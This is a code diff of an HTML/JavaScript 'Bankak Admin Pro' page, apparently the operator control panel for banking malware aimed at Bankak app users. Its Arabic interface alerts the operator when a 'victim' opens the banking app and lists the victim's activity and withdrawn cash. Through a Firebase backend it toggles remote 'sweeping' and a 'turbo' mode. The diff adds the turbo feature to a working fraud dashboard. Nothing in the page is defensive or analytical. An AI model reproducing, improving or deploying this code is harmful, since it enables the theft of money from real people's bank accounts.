@@ -3,52 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bankak Admin Pro - Notifications</title>
+    <title>Bankak Admin Pro - Full System</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --main-blue: #003366; --gold: #d4af37; }
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
-        .card { background: white; max-width: 450px; margin: auto; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); overflow: hidden; border-top: 6px solid var(--main-blue); }
+        :root { --main-blue: #003366; --gold: #d4af37; --bg: #f4f7f6; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; padding: 10px; }
+        .card { background: white; max-width: 450px; margin: auto; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 6px solid var(--main-blue); }
         .header { background: var(--main-blue); color: white; padding: 20px; text-align: center; }
-        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
+        .alert-banner { display: none; background: #ff3e3e; color: white; padding: 10px; text-align: center; font-weight: bold; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .content { padding: 20px; }
+        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px; transition: 0.3s; }
         .btn-on { background: #27ae60; color: white; }
         .btn-off { background: #e74c3c; color: white; }
-        .notification-banner { display: none; background: #ffcc00; color: #000; padding: 10px; text-align: center; font-weight: bold; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.5; } }
-        .log-box { background: #fff; border: 1px solid #ddd; border-radius: 10px; padding: 10px; margin: 10px; height: 120px; overflow-y: auto; font-size: 13px; }
-        .footer { text-align: center; padding: 15px; font-size: 12px; color: #777; font-weight: bold; }
+        .btn-turbo { background: var(--gold); color: white; border: 2px solid #b8962e; }
+        .section { background: #f9f9f9; border-radius: 12px; padding: 10px; margin-top: 15px; border-right: 4px solid var(--main-blue); }
+        .data-list { font-size: 13px; color: #333; max-height: 100px; overflow-y: auto; margin-top: 5px; }
+        .footer { text-align: center; padding: 15px; font-size: 12px; color: #888; background: #eee; }
     </style>
 </head>
 <body>
 
-<div id="alarmBanner" class="notification-banner">⚠️ تنبيه: الضحية دخل الآن إلى بنكك!</div>
+<div id="alarm" class="alert-banner">⚡ تنبيه: الضحية متصل الآن وتطبيق بنكك مفتوح! ⚡</div>
 
 <div class="card">
     <div class="header">
-        <h2 style="margin:0;">رادار عباس الدولي</h2>
-        <p>نظام التنبيهات الفورية</p>
+        <h2 style="margin:0;">نظام عباس الدولي المتكامل</h2>
+        <p style="font-size:11px; opacity:0.8;">التحكم الآلي - السرعة الخارقة - التنبيه الفوري</p>
     </div>
 
-    <div style="padding: 15px;">
-        <div id="stat" style="text-align:center; margin-bottom:10px; font-weight:bold;">الحالة: جاري المراقبة...</div>
-        <button id="mainBtn" class="btn" onclick="toggle()">تحميل...</button>
+    <div class="content">
+        <div id="stat" style="text-align:center; font-weight:bold; margin-bottom:15px; color:#333;">جاري فحص الاتصال...</div>
         
-        <div class="log-box">
-            <strong style="color:var(--main-blue)">تحركات الضحية:</strong>
-            <div id="logs"></div>
+        <button id="mainBtn" class="btn" onclick="toggleStatus()">تحميل...</button>
+        
+        <button id="turboBtn" class="btn btn-turbo" onclick="toggleTurbo()">وضع السرعة: عادي</button>
+
+        <div class="section">
+            <strong style="color:var(--main-blue)">سجل النشاط المباشر:</strong>
+            <div id="logs" class="data-list"></div>
         </div>
 
-        <div class="log-box" style="border-right: 4px solid var(--gold); height: 80px;">
-            <strong style="color:var(--gold)">الأموال المسحوبة:</strong>
-            <div id="cash"></div>
+        <div class="section" style="border-right-color: var(--gold);">
+            <strong style="color:var(--gold)">إجمالي السحوبات (Cash):</strong>
+            <div id="cash" class="data-list"></div>
         </div>
     </div>
 
     <div class="footer">برمجة وتصميم - عباس الدولي@2026</div>
 </div>
 
-<audio id="notifSound" src="https://www.soundjay.com/buttons/beep-01a.mp3" preload="auto"></audio>
+<audio id="beep" src="https://www.soundjay.com/buttons/beep-01a.mp3" preload="auto"></audio>
 
 <script>
     const firebaseConfig = {
@@ -60,43 +66,44 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let s = false;
+    let status = false, turbo = false;
 
-    // مراقبة الحالة العامة
+    // مراقبة الحالة والسرعة
     db.ref('control/status').on('value', snap => {
-        s = snap.val() === "true" || snap.val() === true;
-        document.getElementById('stat').innerText = "نظام السحب: " + (s ? "جاهز للكسح" : "متوقف");
+        status = snap.val() === "true" || snap.val() === true;
+        document.getElementById('stat').innerText = "النظام الآن: " + (status ? "نشط ومراقب" : "متوقف");
         const b = document.getElementById('mainBtn');
-        b.innerText = s ? "إيقاف النظام" : "تفعيل النظام";
-        b.className = "btn " + (s ? "btn-off" : "btn-on");
+        b.innerText = status ? "إيقاف الكسح" : "تفعيل الكسح";
+        b.className = "btn " + (status ? "btn-off" : "btn-on");
     });
 
-    function toggle() { db.ref('control/status').set(s ? "false" : "true"); }
+    db.ref('control/turbo').on('value', snap => {
+        turbo = snap.val() === "true" || snap.val() === true;
+        document.getElementById('turboBtn').innerText = "الوضع الخارق: " + (turbo ? "مـفـعـل ✅" : "مـعـطل ❌");
+    });
 
-    // آلية التنبيه الفوري عند دخول الضحية
+    function toggleStatus() { db.ref('control/status').set(status ? "false" : "true"); }
+    function toggleTurbo() { db.ref('control/turbo').set(turbo ? "false" : "true"); }
+
+    // نظام التنبيه الذكي
     db.ref('MyActivities').limitToLast(1).on('child_added', snap => {
-        const activity = snap.val();
-        if(activity.includes("تم فتح بنكك") || activity.includes("دخول")) {
-            // تشغيل الصوت وإظهار البانر
-            document.getElementById('alarmBanner').style.display = 'block';
-            document.getElementById('notifSound').play();
-            
-            // إخفاء التنبيه بعد 10 ثواني
-            setTimeout(() => {
-                document.getElementById('alarmBanner').style.display = 'none';
-            }, 10000);
+        const msg = snap.val();
+        if(msg.includes("فتح") || msg.includes("دخول") || msg.includes("Bankak")) {
+            document.getElementById('alarm').style.display = 'block';
+            document.getElementById('beep').play();
+            setTimeout(() => { document.getElementById('alarm').style.display = 'none'; }, 8000);
         }
     });
 
-    // تحديث السجلات
-    db.ref('MyActivities').limitToLast(4).on('value', snap => {
+    // عرض البيانات
+    db.ref('MyActivities').limitToLast(5).on('value', snap => {
         const d = document.getElementById('logs'); d.innerHTML = "";
-        snap.forEach(c => { d.innerHTML += `<div>📍 ${c.val()}</div>`; });
+        snap.forEach(c => { d.innerHTML += `<div>• ${c.val()}</div>`; });
     });
 
     db.ref('Cash').limitToLast(3).on('value', snap => {
         const d = document.getElementById('cash'); d.innerHTML = "";
-        snap.forEach(c => { d.innerHTML += `<div>💰 تم سحب: ${c.val()}</div>`; });
+        snap.forEach(c => { d.innerHTML += `<div style="color:green; font-weight:bold;">💰 ${c.val()}</div>`; });
     });
 </script>
 
